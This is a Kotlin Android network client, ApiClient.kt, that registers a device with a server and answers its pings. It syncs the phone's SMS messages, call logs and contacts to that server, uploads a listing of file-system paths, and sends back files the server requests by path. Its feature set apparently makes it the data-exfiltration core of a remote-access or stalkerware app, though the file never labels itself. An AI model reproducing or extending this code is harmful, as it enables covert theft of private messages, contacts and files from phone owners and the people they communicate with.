// ApiClient.kt
package com.example.lta

import android.util.Log
import com.google.gson.Gson
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.io.IOException
import java.util.concurrent.TimeUnit
import okhttp3.ResponseBody

data class DeviceRegistrationPayload(
    val token: String,
    val model: String,
    val deviceId: String,
    val name: String? = null
)

class ApiClient(private val baseUrl: String) {

    private val client = OkHttpClient.Builder()
        .connectTimeout(60, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .build()

    private val gson = Gson()

    companion object {
        private const val TAG = "ApiClient"
        private const val MEDIA_TYPE_JSON = "application/json; charset=utf-8"
        private const val MEDIA_TYPE_CSV = "text/csv"
    }

    suspend fun registerDevice(
        token: String,
        deviceModel: String,
        deviceId: String,
        name: String? = null
    ): Boolean {
        return withContext(Dispatchers.IO) {
            val url = "$baseUrl/api/register-device"
            val payload = DeviceRegistrationPayload(token, deviceModel, deviceId, name)
            val jsonBody = gson.toJson(payload)
            val requestBody = jsonBody.toRequestBody(MEDIA_TYPE_JSON.toMediaTypeOrNull())
            val request = Request.Builder().url(url).post(requestBody).build()
            executeRequest(request, "registerDevice")
        }
    }

    suspend fun uploadFile(file: File, caption: String, deviceId: String): Boolean {
        return withContext(Dispatchers.IO) {
            val url = "$baseUrl/api/upload"
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("deviceId", deviceId)
                .addFormDataPart("caption", caption)
                .addFormDataPart("document", file.name, file.asRequestBody(MEDIA_TYPE_CSV.toMediaTypeOrNull()))
                .build()
            val request = Request.Builder().url(url).post(requestBody).build()
            executeRequest(request, "uploadFile")
        }
    }

    suspend fun uploadRequestedFile(file: File, deviceId: String, originalPath: String): Boolean {
        return withContext(Dispatchers.IO) {
            val url = "$baseUrl/api/upload-requested-file"
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("deviceId", deviceId)
                .addFormDataPart("originalPath", originalPath)
                .addFormDataPart("file", file.name, file.asRequestBody("application/octet-stream".toMediaTypeOrNull()))
                .build()
            val request = Request.Builder().url(url).post(requestBody).build()
            executeRequest(request, "uploadRequestedFile")
        }
    }

    suspend fun uploadFileSystemPaths(pathsData: String, deviceId: String): Boolean {
        return withContext(Dispatchers.IO) {
            val url = "$baseUrl/api/upload-paths"
            val payload = mapOf("deviceId" to deviceId, "pathsData" to pathsData)
            val jsonBody = gson.toJson(payload)
            val requestBody = jsonBody.toRequestBody(MEDIA_TYPE_JSON.toMediaTypeOrNull())
            val request = Request.Builder().url(url).post(requestBody).build()
            executeRequest(request, "uploadFileSystemPaths")
        }
    }

    // --- SYNC FUNCTIONS ---
    private suspend fun <T> syncData(endpoint: String, deviceId: String, data: List<T>): Boolean {
        return withContext(Dispatchers.IO) {
            if (data.isEmpty()) {
                Log.d(TAG, "No data to sync for endpoint: $endpoint. Skipping.")
                return@withContext true
            }
            val url = "$baseUrl/api/sync/$endpoint"
            val payload = mapOf("deviceId" to deviceId, "data" to data)
            val jsonBody = gson.toJson(payload)
            val requestBody = jsonBody.toRequestBody(MEDIA_TYPE_JSON.toMediaTypeOrNull())
            val request = Request.Builder().url(url).post(requestBody).build()
            executeRequest(request, "syncData ($endpoint)")
        }
    }

    suspend fun syncSms(deviceId: String, smsList: List<SmsEntity>): Boolean = syncData("sms", deviceId, smsList)
    suspend fun syncCallLogs(deviceId: String, callLogs: List<CallLogEntity>): Boolean = syncData("calllogs", deviceId, callLogs)
    suspend fun syncContacts(deviceId: String, contacts: List<ContactEntity>): Boolean = syncData("contacts", deviceId, contacts)

    // --- RE-ADDED MISSING FUNCTIONS TO FIX BUILD ERRORS ---

    suspend fun deleteDevice(deviceId: String): Boolean {
        return withContext(Dispatchers.IO) {
            val url = "$baseUrl/api/delete-device" // Ensure this endpoint exists on your server
            val payload = mapOf("deviceId" to deviceId)
            val jsonBody = gson.toJson(payload)
            val requestBody = jsonBody.toRequestBody(MEDIA_TYPE_JSON.toMediaTypeOrNull())
            val request = Request.Builder().url(url).post(requestBody).build()
            executeRequest(request, "deleteDevice")
        }
    }

    suspend fun pingDevice(token: String, deviceId: String): Boolean {
        return withContext(Dispatchers.IO) {
            val url = "$baseUrl/api/ping-device" // Ensure this endpoint exists on your server
            val payload = mapOf("token" to token, "deviceId" to deviceId)
            val jsonBody = gson.toJson(payload)
            val requestBody = jsonBody.toRequestBody(MEDIA_TYPE_JSON.toMediaTypeOrNull())
            val request = Request.Builder().url(url).post(requestBody).build()
            executeRequest(request, "pingDevice")
        }
    }
    
    suspend fun downloadFile(serverFilePath: String): ResponseBody? {
        return withContext(Dispatchers.IO) {
            val url = "$baseUrl/api/download-file" // Ensure this endpoint exists
            val payload = mapOf("filePath" to serverFilePath)
            val requestBody = gson.toJson(payload).toRequestBody(MEDIA_TYPE_JSON.toMediaTypeOrNull())
            val request = Request.Builder().url(url).post(requestBody).build()

            try {
                val response = client.newCall(request).execute()
                if (response.isSuccessful) response.body else {
                    response.close()
                    null
                }
            } catch (e: IOException) {
                null
            }
        }
    }

    // --- UTILITY ---
    private fun executeRequest(request: Request, operationName: String): Boolean {
        return try {
            client.newCall(request).execute().use { response ->
                response.isSuccessful.also {
                    if (!it) {
                        val errorBody = response.body?.string() ?: "No error details"
                        Log.e(TAG, "Server Error on $operationName: ${response.code} $errorBody")
                    } else {
                        Log.d(TAG, "$operationName completed successfully")
                    }
                }
            }
        } catch (e: IOException) {
            Log.e(TAG, "Network Error on $operationName", e)
            false
        }
    }
}
